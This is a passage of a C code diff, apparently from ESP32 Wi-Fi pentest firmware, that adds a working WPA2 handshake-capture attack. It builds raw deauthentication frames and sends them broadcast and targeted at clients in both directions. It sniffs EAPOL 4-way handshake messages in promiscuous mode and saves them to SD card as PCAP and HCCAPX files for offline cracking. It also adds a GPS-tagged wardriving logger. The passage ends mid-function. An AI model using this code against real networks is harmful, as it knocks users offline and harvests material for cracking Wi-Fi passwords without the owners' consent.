+        check_handshake_file_exists_by_bssid(bssid);
+    if (hs_ap_targets[idx].has_existing_file) {
+        ESP_LOGI(TAG, "[HS] Skipping '%s' - PCAP already exists", hs_ap_targets[idx].ssid);
+    }
+    return idx;
+}
+
+static int hs_find_client(const uint8_t *mac) {
+    for (int i = 0; i < hs_client_count; i++) {
+        if (memcmp(hs_clients[i].mac, mac, 6) == 0) return i;
+    }
+    return -1;
+}
+
+static int hs_add_or_update_client(const uint8_t *client_mac, int ap_index, int rssi) {
+    int64_t now = esp_timer_get_time();
+    int idx = hs_find_client(client_mac);
+    if (idx >= 0) {
+        if (ap_index >= 0) hs_clients[idx].hs_ap_index = ap_index;
+        hs_clients[idx].rssi = rssi;
+        hs_clients[idx].last_seen_us = now;
+        return idx;
+    }
+    if (hs_client_count >= HS_MAX_CLIENTS) return -1;
+    idx = hs_client_count++;
+    memcpy(hs_clients[idx].mac, client_mac, 6);
+    hs_clients[idx].hs_ap_index = ap_index;
+    hs_clients[idx].rssi = rssi;
+    hs_clients[idx].last_seen_us = now;
+    hs_clients[idx].last_deauth_us = 0;
+    hs_clients[idx].deauthed = false;
+    hs_dwell_new_clients++;
+    return idx;
+}
+
+// ============================================================================
+// Sniffer Handshake: EAPOL Message Detection
+// ============================================================================
+
+static uint8_t hs_get_eapol_msg_num(eapol_key_packet_t *eapol_key) {
+    if (!eapol_key) return 0;
+    uint16_t key_info_raw = *((uint16_t*)&eapol_key->key_information);
+    uint8_t byte0 = (key_info_raw >> 8) & 0xFF;
+    uint8_t byte1 = key_info_raw & 0xFF;
+    bool key_ack = (byte0 & 0x80) != 0;
+    bool install = (byte0 & 0x40) != 0;
+    bool key_mic = (byte1 & 0x01) != 0;
+    if (key_ack && !install && !key_mic) return 1;
+    if (key_ack && install && key_mic) return 3;
+    if (!key_ack && key_mic && !install) {
+        bool has_nonce = false;
+        for (int i = 0; i < 16; i++) {
+            if (eapol_key->key_nonce[i] != 0) { has_nonce = true; break; }
+        }
+        return has_nonce ? 2 : 4;
+    }
+    return 0;
+}
+
+// ============================================================================
+// Sniffer Handshake: Targeted Deauth
+// ============================================================================
+
+static void hs_send_raw_frame(const uint8_t *frame, size_t len) {
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
+    if (err == ESP_ERR_INVALID_ARG) {
+        esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
+    }
+}
+
+static void hs_send_targeted_deauth(const uint8_t *station_mac, const uint8_t *ap_bssid, uint8_t channel) {
+    uint8_t current_channel;
+    wifi_second_chan_t second_chan;
+    esp_wifi_get_channel(&current_channel, &second_chan);
+    if (current_channel != channel) {
+        vTaskDelay(pdMS_TO_TICKS(20));
+        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+        vTaskDelay(pdMS_TO_TICKS(20));
+    }
+    uint8_t deauth_frame[] = {
+        0xC0, 0x00,
+        0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00,
+        0x01, 0x00
+    };
+
+    // Broadcast deauth (like the working Deauther does)
+    static const uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    memcpy(&deauth_frame[4], broadcast_mac, 6);
+    memcpy(&deauth_frame[10], ap_bssid, 6);
+    memcpy(&deauth_frame[16], ap_bssid, 6);
+    for (int i = 0; i < 5; i++) {
+        hs_send_raw_frame(deauth_frame, sizeof(deauth_frame));
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+
+    // Targeted deauth: AP -> client
+    memcpy(&deauth_frame[4], station_mac, 6);
+    memcpy(&deauth_frame[10], ap_bssid, 6);
+    memcpy(&deauth_frame[16], ap_bssid, 6);
+    for (int i = 0; i < 5; i++) {
+        hs_send_raw_frame(deauth_frame, sizeof(deauth_frame));
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+
+    // Targeted deauth: client -> AP (bidirectional)
+    memcpy(&deauth_frame[4], ap_bssid, 6);
+    memcpy(&deauth_frame[10], station_mac, 6);
+    memcpy(&deauth_frame[16], ap_bssid, 6);
+    for (int i = 0; i < 3; i++) {
+        hs_send_raw_frame(deauth_frame, sizeof(deauth_frame));
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+}
+
+// ============================================================================
+// Sniffer Handshake: Per-AP PCAP Save
+// ============================================================================
+
+static void hs_sanitize_ssid(char *out, const char *in, size_t out_size) {
+    size_t j = 0;
+    for (size_t i = 0; in[i] && j < out_size - 1; i++) {
+        char c = in[i];
+        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
+            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.') {
+            out[j++] = c;
+        } else {
+            out[j++] = '_';
+        }
+    }
+    out[j] = '\0';
+    if (j == 0) {
+        strncpy(out, "hidden", out_size - 1);
+        out[out_size - 1] = '\0';
+    }
+}
+
+static bool hs_save_handshake_to_sd(int ap_idx) {
+    hs_ap_target_t *ap = &hs_ap_targets[ap_idx];
+    hccapx_t *hccapx = (hccapx_t *)hccapx_serializer_get();
+    unsigned pcap_size = pcap_serializer_get_size();
+    uint8_t *pcap_buf = pcap_serializer_get_buffer();
+
+    if (!pcap_buf || pcap_size == 0) {
+        ESP_LOGI(TAG, "[HS-SAVE] No PCAP data for '%s'", ap->ssid);
+        return false;
+    }
+
+    if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
+
+    struct stat st = {0};
+    if (stat("/sdcard/lab/handshakes", &st) == -1) {
+        mkdir("/sdcard/lab", 0777);
+        mkdir("/sdcard/lab/handshakes", 0700);
+    }
+
+    char ssid_safe[33];
+    char mac_suffix[7];
+    hs_sanitize_ssid(ssid_safe, ap->ssid, sizeof(ssid_safe));
+    snprintf(mac_suffix, sizeof(mac_suffix), "%02X%02X%02X",
+             ap->bssid[3], ap->bssid[4], ap->bssid[5]);
+
+    uint64_t timestamp = esp_timer_get_time() / 1000;
+    char filename[128];
+
+    snprintf(filename, sizeof(filename), "/sdcard/lab/handshakes/%s_%s_%llu.pcap",
+             ssid_safe, mac_suffix, (unsigned long long)timestamp);
+
+    FILE *f = fopen(filename, "wb");
+    if (!f) {
+        ESP_LOGI(TAG, "[HS-SAVE] Failed to open: %s", filename);
+        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
+        return false;
+    }
+    size_t written = fwrite(pcap_buf, 1, pcap_size, f);
+    fclose(f);
+
+    if (written != pcap_size) {
+        ESP_LOGI(TAG, "[HS-SAVE] Incomplete write: %zu/%u", written, pcap_size);
+        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
+        return false;
+    }
+    ESP_LOGI(TAG, "[HS-SAVE] PCAP saved: %s (%u bytes)", filename, pcap_size);
+
+    if (hccapx) {
+        snprintf(filename, sizeof(filename), "/sdcard/lab/handshakes/%s_%s_%llu.hccapx",
+                 ssid_safe, mac_suffix, (unsigned long long)timestamp);
+        f = fopen(filename, "wb");
+        if (f) {
+            fwrite(hccapx, 1, sizeof(hccapx_t), f);
+            fclose(f);
+            ESP_LOGI(TAG, "[HS-SAVE] HCCAPX saved: %s", filename);
+        }
+    }
+
+    int fd = open("/sdcard/.sync", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd >= 0) { fsync(fd); close(fd); unlink("/sdcard/.sync"); }
+
+    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
+
+    ESP_LOGI(TAG, "Complete 4-way handshake saved for SSID: %s (MAC: %s)", ssid_safe, mac_suffix);
+    return true;
+}
+
+// ============================================================================
+// Sniffer Handshake: Promiscuous Callback
+// ============================================================================
+
+static void hs_sniffer_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (!handshake_attack_active) return;
+    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
+
+    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const uint8_t *frame = pkt->payload;
+    int len = pkt->rx_ctrl.sig_len;
+    if (len < 24) return;
+
+    uint8_t frame_type = frame[0] & 0xFC;
+    uint8_t to_ds = (frame[1] & 0x01) != 0;
+    uint8_t from_ds = (frame[1] & 0x02) != 0;
+    uint8_t *addr1 = (uint8_t *)&frame[4];
+    uint8_t *addr2 = (uint8_t *)&frame[10];
+    uint8_t *addr3 = (uint8_t *)&frame[16];
+
+    if (type == WIFI_PKT_MGMT) {
+        if (frame_type == 0x80) {
+            uint8_t *ap_bssid = addr2;
+            const uint8_t *body = frame + 24 + 12;
+            int body_len = len - 24 - 12;
+            char ssid[33] = {0};
+            uint8_t beacon_channel = pkt->rx_ctrl.channel;
+            wifi_auth_mode_t authmode = WIFI_AUTH_OPEN;
+            int offset = 0;
+            while (offset + 2 <= body_len) {
+                uint8_t tag = body[offset];
+                uint8_t tag_len = body[offset + 1];
+                if (offset + 2 + tag_len > body_len) break;
+                if (tag == 0 && tag_len > 0 && tag_len <= 32) {
+                    memcpy(ssid, &body[offset + 2], tag_len);
+                    ssid[tag_len] = '\0';
+                } else if (tag == 3 && tag_len == 1) {
+                    beacon_channel = body[offset + 2];
+                } else if (tag == 48) {
+                    authmode = WIFI_AUTH_WPA2_PSK;
+                } else if (tag == 221) {
+                    if (tag_len >= 4 && body[offset+2] == 0x00 && body[offset+3] == 0x50 &&
+                        body[offset+4] == 0xF2 && body[offset+5] == 0x01) {
+                        if (authmode == WIFI_AUTH_OPEN) authmode = WIFI_AUTH_WPA_PSK;
+                    }
+                }
+                offset += 2 + tag_len;
+            }
+            if (authmode != WIFI_AUTH_OPEN) {
+                int ap_idx = hs_add_or_update_ap(ap_bssid, ssid, beacon_channel, authmode, pkt->rx_ctrl.rssi);
+                if (ap_idx >= 0 && !hs_ap_targets[ap_idx].beacon_captured &&
+                    !hs_ap_targets[ap_idx].has_existing_file && !hs_ap_targets[ap_idx].complete) {
+                    pcap_serializer_append_frame(frame, len, pkt->rx_ctrl.timestamp);
+                    hs_ap_targets[ap_idx].beacon_captured = true;
+                }
+            }
+            return;
+        }
+        if (frame_type == 0x00 || frame_type == 0xB0) {
+            uint8_t *client_mac = addr2;
+            uint8_t *ap_mac = addr1;
+            if (client_mac[0] & 0x01) return;
+            int ap_idx = hs_find_ap(ap_mac);
+            if (ap_idx >= 0 && !hs_ap_targets[ap_idx].has_existing_file && !hs_ap_targets[ap_idx].complete) {
+                hs_add_or_update_client(client_mac, ap_idx, pkt->rx_ctrl.rssi);
+            }
+        }
+        return;
+    }
+
+    if (type == WIFI_PKT_DATA) {
+        uint8_t *client_mac = NULL;
+        uint8_t *ap_mac = NULL;
+        if (to_ds && !from_ds) {
+            ap_mac = addr1; client_mac = addr2;
+        } else if (!to_ds && from_ds) {
+            ap_mac = addr2; client_mac = addr1;
+        } else if (!to_ds && !from_ds) {
+            ap_mac = addr3; client_mac = addr2;
+        } else {
+            return;
+        }
+        if (client_mac[0] & 0x01) return;
+        int ap_idx = hs_find_ap(ap_mac);
+        if (ap_idx < 0) return;
+        hs_ap_target_t *ap = &hs_ap_targets[ap_idx];
+        if (ap->has_existing_file || ap->complete) return;
+        hs_add_or_update_client(client_mac, ap_idx, pkt->rx_ctrl.rssi);
+
+        data_frame_t *data_frame = (data_frame_t *)frame;
+        eapol_packet_t *eapol = parse_eapol_packet(data_frame);
+        if (!eapol) return;
+        eapol_key_packet_t *eapol_key = parse_eapol_key_packet(eapol);
+        if (!eapol_key) return;
+        uint8_t msg_num = hs_get_eapol_msg_num(eapol_key);
+        if (msg_num == 0) return;
+
+        hs_dwell_eapol_frames++;
+        bool is_new = false;
+        switch (msg_num) {
+            case 1: if (!ap->captured_m1) { ap->captured_m1 = true; is_new = true; } break;
+            case 2: if (!ap->captured_m2) { ap->captured_m2 = true; is_new = true; } break;
+            case 3: if (!ap->captured_m3) { ap->captured_m3 = true; is_new = true; } break;
+            case 4: if (!ap->captured_m4) { ap->captured_m4 = true; is_new = true; } break;
+        }
+        if (is_new) {
+            ESP_LOGI(TAG, "[HS-SNIFF] EAPOL M%d captured for '%s'", msg_num, ap->ssid);
+            hs_ui_update_flag = true;
+        }
+
+        pcap_serializer_append_frame(frame, len, pkt->rx_ctrl.timestamp);
+        hccapx_serializer_add_frame(data_frame);
+
+        if (ap->captured_m1 && ap->captured_m2 && ap->captured_m3 && ap->captured_m4) {
+            ap->complete = true;
+            hs_ui_update_flag = true;
+            ESP_LOGI(TAG, "Handshake captured for '%s' - all 4 EAPOL messages!", ap->ssid);
+        }
+    }
+}
+
+// ============================================================================
+// Wardrive Promisc: Promiscuous Callback and Buffer Growth
+// ============================================================================
+
+static int wdp_find_bssid(const uint8_t *bssid) {
+    for (int i = 0; i < wdp_seen_count; i++) {
+        if (memcmp(wdp_seen_networks[i].bssid, bssid, 6) == 0) return i;
+    }
+    return -1;
+}
+
+static void wdp_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (!wardrive_active) return;
+    if (type != WIFI_PKT_MGMT) return;
+
+    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const uint8_t *frame = pkt->payload;
+    int len = pkt->rx_ctrl.sig_len;
+    if (len < 36) return;
+
+    uint8_t frame_type = frame[0] & 0xFC;
+    if (frame_type != 0x80) return;
+
+    const uint8_t *ap_bssid = &frame[10];
+    const uint8_t *body = frame + 24 + 12;
+    int body_len = len - 24 - 12;
+    if (body_len < 2) return;
+
+    char ssid[33] = {0};
+    uint8_t beacon_channel = pkt->rx_ctrl.channel;
+    wifi_auth_mode_t authmode = WIFI_AUTH_OPEN;
+    int offset = 0;
+    while (offset + 2 <= body_len) {
+        uint8_t tag = body[offset];
+        uint8_t tag_len = body[offset + 1];
+        if (offset + 2 + tag_len > body_len) break;
+        if (tag == 0 && tag_len > 0 && tag_len <= 32) {
+            memcpy(ssid, &body[offset + 2], tag_len);
+            ssid[tag_len] = '\0';
+        } else if (tag == 3 && tag_len == 1) {
+            beacon_channel = body[offset + 2];
+        } else if (tag == 48) {
+            authmode = WIFI_AUTH_WPA2_PSK;
+        } else if (tag == 221) {
+            if (tag_len >= 4 && body[offset+2] == 0x00 && body[offset+3] == 0x50 &&
+                body[offset+4] == 0xF2 && body[offset+5] == 0x01) {
+                if (authmode == WIFI_AUTH_OPEN) authmode = WIFI_AUTH_WPA_PSK;
+            }
+        }
+        offset += 2 + tag_len;
+    }
+
+    int existing = wdp_find_bssid(ap_bssid);
+    if (existing >= 0) {
+        if (pkt->rx_ctrl.rssi > wdp_seen_networks[existing].rssi) {
+            wdp_seen_networks[existing].rssi = (int8_t)pkt->rx_ctrl.rssi;
+        }
+        return;
+    }
+
+    if (wdp_seen_count >= wdp_seen_capacity) {
+        wdp_needs_grow = true;
+        return;
+    }
+
+    int idx = wdp_seen_count;
+    memcpy(wdp_seen_networks[idx].bssid, ap_bssid, 6);
+    strncpy(wdp_seen_networks[idx].ssid, ssid, 32);
+    wdp_seen_networks[idx].ssid[32] = '\0';
+    wdp_seen_networks[idx].channel = beacon_channel;
+    wdp_seen_networks[idx].rssi = (int8_t)pkt->rx_ctrl.rssi;
+    wdp_seen_networks[idx].authmode = authmode;
+    wdp_seen_networks[idx].written_to_file = false;
+    wdp_seen_networks[idx].latitude = current_gps.valid ? current_gps.latitude : 0.0f;
+    wdp_seen_networks[idx].longitude = current_gps.valid ? current_gps.longitude : 0.0f;
+    wdp_seen_count++;
+    wdp_dwell_new_networks++;
+}
+
+static bool wdp_grow_network_buffer(void) {
+    int new_capacity = wdp_seen_capacity * 2;
+    size_t new_size = (size_t)new_capacity * sizeof(wdp_network_t);
+    size_t free_psram = heap_caps_get_free_size(MALLOC_CAP_SPIRAM);
+
+    if (free_psram < new_size + WDP_PSRAM_RESERVE_BYTES) {
+        ESP_LOGI(TAG, "Cannot grow wardrive buffer: only %u bytes free PSRAM", (unsigned)free_psram);
+        return false;
+    }
+
+    wdp_network_t *new_buf = (wdp_network_t *)heap_caps_realloc(wdp_seen_networks, new_size, MALLOC_CAP_SPIRAM);
+    if (!new_buf) {
+        ESP_LOGI(TAG, "Failed to realloc wardrive buffer to %d entries", new_capacity);
+        return false;
+    }
+
+    memset(&new_buf[wdp_seen_capacity], 0, (size_t)(new_capacity - wdp_seen_capacity) * sizeof(wdp_network_t));
+    wdp_seen_networks = new_buf;
+    wdp_seen_capacity = new_capacity;
+    wdp_needs_grow = false;
+    ESP_LOGI(TAG, "Wardrive buffer grown to %d entries", new_capacity);
+    return true;
+}
+
 static void handshake_cleanup(void) {
     ESP_LOGI(TAG, "Cleaning up handshake attack...");
     
-    // Stop any running attack
     attack_handshake_stop();
+    esp_wifi_set_promiscuous(false);
     
-    // Clear global handshaker mode flag
     g_handshaker_global_mode = false;
 
-    // Reset state
     handshake_attack_active = false;
     handshake_target_count = 0;
     handshake_current_index = 0;
     handshake_selected_mode = false;
-    
-    // NOTE: Stack is freed by the caller (stop button), not here
-    // to avoid race condition when task is still running
+
+    hs_ap_count = 0;
+    hs_client_count = 0;
+    hs_dwell_new_clients = 0;
+    hs_dwell_eapol_frames = 0;
+    hs_current_channel = 0;
+    hs_current_target_ssid[0] = '\0';
+    hs_current_client_mac[0] = '\0';
+    hs_listening_after_deauth = false;
+    hs_total_handshakes_captured = 0;
+    if (hs_ap_targets) memset(hs_ap_targets, 0, HS_MAX_APS * sizeof(hs_ap_target_t));
+    if (hs_clients) memset(hs_clients, 0, HS_MAX_CLIENTS * sizeof(hs_client_entry_t));
 }
 
 static void attack_network_with_burst(const wifi_ap_record_t *ap) {
@@ -5936,319 +6933,641 @@ static void attack_network_with_burst(const wifi_ap_record_t *ap) {
     attack_handshake_stop();
 }
 
-static void handshake_attack_task(void *pvParameters) {
-    (void)pvParameters;
-    
-    ESP_LOGI(TAG, "Handshake attack task started.");
-    ESP_LOGI(TAG, "Mode: %s", handshake_selected_mode ? "Selected networks only" : "Scan all networks");
-    
-    // CRITICAL: Wait before ANY SD card operations to avoid SPI bus conflict with LVGL display
-    // The SD card and display share the same SPI bus. If we access SD immediately after task
-    // creation (especially check_handshake_file_exists), it will crash with SPI assert.
-    // Give LVGL time to finish any ongoing display updates.
-    vTaskDelay(pdMS_TO_TICKS(500));
-    
-    int64_t last_scan_time = 0;
-    const int64_t SCAN_INTERVAL_US = 5 * 60 * 1000000; // 5 minutes in microseconds
-    
-    while (handshake_attack_active && !g_operation_stop_requested) {
-        // In scan-all mode, perform periodic scans
-        if (!handshake_selected_mode) {
-            int64_t current_time = esp_timer_get_time();
-            if (current_time - last_scan_time >= SCAN_INTERVAL_US || handshake_target_count == 0) {
-                ESP_LOGI(TAG, "Performing scan for networks...");
-                
-                // Start scan using wifi_scanner
-                esp_err_t scan_result = wifi_scanner_start_scan();
-                if (scan_result != ESP_OK) {
-                    ESP_LOGI(TAG, "Failed to start scan: %s", esp_err_to_name(scan_result));
-                    vTaskDelay(pdMS_TO_TICKS(5000));
-                    continue;
-                }
-                
-                // Wait for scan to complete
-                ESP_LOGI(TAG, "Waiting for scan to complete...");
-                int timeout = 0;
-                while (timeout < 200 && handshake_attack_active && !g_operation_stop_requested) {
-                    uint16_t count = wifi_scanner_get_count();
-                    if (count > 0) {
-                        // Scan completed
-                        break;
-                    }
-                    vTaskDelay(pdMS_TO_TICKS(100));
-                    timeout++;
-                }
-                
-                if (g_operation_stop_requested) {
-                    ESP_LOGI(TAG, "Stop requested during scan, terminating...");
-                    break;
-                }
-                
-                // Get scan results
-                handshake_waiting_for_scan = false;  // Scan is done, clear the flag
-                uint16_t count = wifi_scanner_get_count();
-                if (count == 0) {
-                    ESP_LOGI(TAG, "Scan failed or no results, retrying in 5 seconds...");
-                    vTaskDelay(pdMS_TO_TICKS(5000));
-                    continue;
-                }
-                
-                // Copy scan results to handshake targets
-                handshake_target_count = (count < MAX_AP_CNT) ? count : MAX_AP_CNT;
-                
-                // Get results from scanner
-                wifi_ap_record_t temp_results[MAX_AP_CNT];
-                int got = wifi_scanner_get_results(temp_results, handshake_target_count);
-                if (got > 0) {
-                    memcpy(handshake_targets, temp_results, got * sizeof(wifi_ap_record_t));
-                    handshake_target_count = got;
-                    handshake_current_index = 0;
-                    
-                    ESP_LOGI(TAG, "Found %d networks to attack", handshake_target_count);
-                    last_scan_time = current_time;
-                } else {
-                    ESP_LOGI(TAG, "Failed to get scan results, retrying...");
-                    vTaskDelay(pdMS_TO_TICKS(5000));
-                    continue;
-                }
-            }
+static void handshake_attack_task_selected(void) {
+    ESP_LOGI(TAG, "Handshake selected-mode task running (promisc + targeted deauth).");
+    ESP_LOGI(TAG, "Targets: %d networks", handshake_target_count);
+
+    // Switch to APSTA mode so WIFI_IF_AP is available for raw frame TX
+    wifi_mode_t mode;
+    esp_wifi_get_mode(&mode);
+    if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
+        ESP_LOGI(TAG, "Switching WiFi to APSTA mode for raw frame transmission");
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    wifi_config_t ap_config = {
+        .ap = {
+            .ssid = "",
+            .ssid_len = 0,
+            .ssid_hidden = 1,
+            .channel = 1,
+            .password = "",
+            .max_connection = 0,
+            .authmode = WIFI_AUTH_OPEN
         }
-        
-        // Attack all target networks
-        ESP_LOGI(TAG, "");
-        if (handshake_selected_mode) {
-            ESP_LOGI(TAG, "===== Attacking Selected Networks =====");
-        } else {
-            ESP_LOGI(TAG, "===== PHASE 2: Attack All Networks =====");
+    };
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+
+    hs_ap_count = 0;
+    hs_client_count = 0;
+    if (hs_ap_targets) memset(hs_ap_targets, 0, HS_MAX_APS * sizeof(hs_ap_target_t));
+    if (hs_clients) memset(hs_clients, 0, HS_MAX_CLIENTS * sizeof(hs_client_entry_t));
+
+    for (int i = 0; i < handshake_target_count && i < HS_MAX_APS; i++) {
+        wifi_ap_record_t *ap = &handshake_targets[i];
+        if (ap->ssid[0] != '\0' && check_handshake_file_exists((const char *)ap->ssid)) {
+            handshake_captured[i] = true;
+            ESP_LOGI(TAG, "[HS] Skipping '%s' - PCAP already exists", ap->ssid);
+            continue;
         }
-        ESP_LOGI(TAG, "Attacking %d networks...", handshake_target_count);
-        
-        int attacked_count = 0;
-        int captured_count = 0;
-        
-        for (int i = 0; i < handshake_target_count && handshake_attack_active && !g_operation_stop_requested; i++) {
-            wifi_ap_record_t *ap = &handshake_targets[i];
-            
-            // Skip if already captured
-            if (handshake_captured[i]) {
-                captured_count++;
-                continue;
-            }
-            
-            // Check if file already exists (skip for empty/hidden SSIDs)
-            if (ap->ssid[0] != '\0' && check_handshake_file_exists((const char*)ap->ssid)) {
-                ESP_LOGI(TAG, "[%d/%d] Skipping '%s' - PCAP already exists", 
-                           i + 1, handshake_target_count, (const char*)ap->ssid);
-                handshake_captured[i] = true;
-                captured_count++;
-                continue;
-            }
-            
-            attacked_count++;
-            ESP_LOGI(TAG, "");
-            ESP_LOGI(TAG, ">>> [%d/%d] Attacking '%s' (Ch %d, RSSI: %d dBm) <<<", 
-                       i + 1, handshake_target_count, (const char*)ap->ssid, ap->primary, ap->rssi);
-            
-            // Attack with burst strategy
-            attack_network_with_burst(ap);
-            
-            // Check if captured
-            if (attack_handshake_is_complete()) {
-                handshake_captured[i] = true;
-                captured_count++;
-                ESP_LOGI(TAG, " Handshake #%d captured! ", captured_count);
-            }
-            
-            // Delay before next network
-            if (i < handshake_target_count - 1) {
-                ESP_LOGI(TAG, "Cooling down 2s before next network...");
-                vTaskDelay(pdMS_TO_TICKS(2000));
-            }
-        }
-        
-        ESP_LOGI(TAG, "");
-        ESP_LOGI(TAG, "===== Attack Cycle Complete =====");
-        ESP_LOGI(TAG, "Total networks: %d", handshake_target_count);
-        ESP_LOGI(TAG, "Networks attacked this cycle: %d", attacked_count);
-        ESP_LOGI(TAG, "Handshakes captured so far: %d", captured_count);
-        
-        // Check if all selected networks captured (for selected mode)
-        if (handshake_selected_mode) {
-            bool all_done = true;
-            int remaining = 0;
-            for (int i = 0; i < handshake_target_count; i++) {
-                if (!handshake_captured[i]) {
-                    all_done = false;
-                    remaining++;
-                }
-            }
-            
-            if (all_done) {
-                ESP_LOGI(TAG, "All selected networks captured! Attack complete.");
-                break;
-            }
-            
-            // Continue looping until all captured
-            ESP_LOGI(TAG, "Selected mode: %d networks still need handshakes, repeating attack cycle...", remaining);
-            vTaskDelay(pdMS_TO_TICKS(3000)); // Small delay before next loop
-        } else {
-            // In scan-all mode, done after one cycle (no periodic scan in GUI mode)
-            ESP_LOGI(TAG, "Scan-all mode: Attack cycle complete.");
-            break;
+        int idx = hs_add_or_update_ap(ap->bssid, (const char *)ap->ssid,
+                                       ap->primary,
+                                       ap->authmode, ap->rssi);
+        if (idx >= 0) {
+            hs_ap_targets[idx].target_index = i;
         }
     }
-    
-    // Cleanup
+
+    pcap_serializer_init();
+
+    wifi_promiscuous_filter_t filt = {
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
+    };
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous_rx_cb(hs_sniffer_promiscuous_cb);
+    esp_wifi_set_promiscuous(true);
+    ESP_LOGI(TAG, "Promiscuous mode enabled for selected-mode attack.");
+
+    while (handshake_attack_active && !g_operation_stop_requested) {
+        bool all_done = true;
+        int captured_count = 0;
+
+        for (int t = 0; t < handshake_target_count && handshake_attack_active && !g_operation_stop_requested; t++) {
+            if (handshake_captured[t]) { captured_count++; continue; }
+            all_done = false;
+
+            wifi_ap_record_t *target_ap = &handshake_targets[t];
+            int ap_idx = -1;
+            for (int a = 0; a < hs_ap_count; a++) {
+                if (memcmp(hs_ap_targets[a].bssid, target_ap->bssid, 6) == 0) {
+                    ap_idx = a; break;
+                }
+            }
+
+            uint8_t channel = target_ap->primary;
+            hs_current_channel = channel;
+            snprintf(hs_current_target_ssid, sizeof(hs_current_target_ssid), "%s", (const char *)target_ap->ssid);
+            hs_ui_update_flag = true;
+
+            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+            ESP_LOGI(TAG, ">>> [%d/%d] Attacking '%s' (Ch %d) - listening for clients <<<",
+                     t + 1, handshake_target_count, target_ap->ssid, channel);
+
+            int rounds_without_client = 0;
+            #define HS_SELECTED_MAX_IDLE_ROUNDS 15
+
+            for (int round = 0; handshake_attack_active && !g_operation_stop_requested; round++) {
+                vTaskDelay(pdMS_TO_TICKS(500));
+                if (!handshake_attack_active || g_operation_stop_requested) break;
+
+                if (ap_idx < 0) {
+                    for (int a = 0; a < hs_ap_count; a++) {
+                        if (memcmp(hs_ap_targets[a].bssid, target_ap->bssid, 6) == 0) {
+                            ap_idx = a; break;
+                        }
+                    }
+                }
+
+                if (ap_idx >= 0 && hs_ap_targets[ap_idx].complete) {
+                    ESP_LOGI(TAG, "Handshake complete for '%s'!", target_ap->ssid);
+                    break;
+                }
+
+                // Verify radio is on the correct channel before deauthing
+                uint8_t actual_ch;
+                wifi_second_chan_t sec_ch;
+                esp_wifi_get_channel(&actual_ch, &sec_ch);
+                if (actual_ch != channel) {
+                    ESP_LOGW(TAG, "[HS] Channel mismatch! Radio on %d, target on %d. Switching.", actual_ch, channel);
+                    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+                    vTaskDelay(pdMS_TO_TICKS(10));
+                }
+
+                int64_t now = esp_timer_get_time();
+                int deauth_sent = 0;
+                for (int c = 0; c < hs_client_count && handshake_attack_active; c++) {
+                    hs_client_entry_t *cl = &hs_clients[c];
+                    if (cl->hs_ap_index != ap_idx || ap_idx < 0) continue;
+                    hs_ap_target_t *ap = &hs_ap_targets[ap_idx];
+                    if (ap->complete) break;
+                    if (cl->last_deauth_us > 0 &&
+                        (now - cl->last_deauth_us) < HS_DEAUTH_COOLDOWN_US) continue;
+
+                    snprintf(hs_current_client_mac, sizeof(hs_current_client_mac),
+                             "%02X:%02X:%02X:%02X:%02X:%02X",
+                             cl->mac[0], cl->mac[1], cl->mac[2],
+                             cl->mac[3], cl->mac[4], cl->mac[5]);
+                    hs_listening_after_deauth = false;
+                    hs_ui_update_flag = true;
+
+                    ESP_LOGI(TAG, ">>> Deauth '%s' (RadioCH:%d) -> %s <<<",
+                             target_ap->ssid, channel, hs_current_client_mac);
+
+                    size_t ssid_len = strlen((const char *)target_ap->ssid);
+                    hccapx_serializer_init((const uint8_t *)target_ap->ssid, ssid_len);
+
+                    hs_send_targeted_deauth(cl->mac, target_ap->bssid, channel);
+                    cl->last_deauth_us = now;
+                    cl->deauthed = true;
+                    if (ap_idx >= 0) hs_ap_targets[ap_idx].last_deauth_us = now;
+                    deauth_sent++;
+
+                    if (deauth_sent >= 3) break;
+                }
+
+                if (deauth_sent > 0) {
+                    rounds_without_client = 0;
+                    hs_listening_after_deauth = true;
+                    hs_ui_update_flag = true;
+                    ESP_LOGI(TAG, "[HS] Listening for handshake on CH %d after %d deauths...", channel, deauth_sent);
+                    for (int w = 0; w < 20 && handshake_attack_active && !g_operation_stop_requested; w++) {
+                        vTaskDelay(pdMS_TO_TICKS(150));
+                        if (ap_idx >= 0 && hs_ap_targets[ap_idx].complete) break;
+                    }
+                    hs_listening_after_deauth = false;
+                    hs_ui_update_flag = true;
+                } else {
+                    rounds_without_client++;
+                }
+
+                if (ap_idx >= 0 && hs_ap_targets[ap_idx].complete) break;
+
+                if (handshake_target_count > 1 && rounds_without_client > HS_SELECTED_MAX_IDLE_ROUNDS) {
